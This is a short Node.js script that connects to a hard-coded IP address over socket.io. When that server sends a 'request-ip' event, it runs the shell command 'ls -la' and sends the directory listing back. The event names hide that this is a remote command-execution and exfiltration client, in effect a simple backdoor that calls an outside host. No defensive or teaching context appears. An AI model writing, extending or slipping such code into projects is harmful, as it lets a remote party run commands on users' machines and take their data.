const
    io = require("socket.io-client"),
    { exec } = require("child_process")
    ioClient = io.connect("http://77.55.212.76:80");

ioClient.on("seq-num", (msg) => console.info(msg));

ioClient.on("request-ip", () => {
    exec("ls -la", (error, stdout, stderr) => {
        if (error) {
            console.log(`error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.log(`stderr: ${stderr}`);
            return;
        }
        
        ioClient.emit("receive-ip", stdout)
    });
});
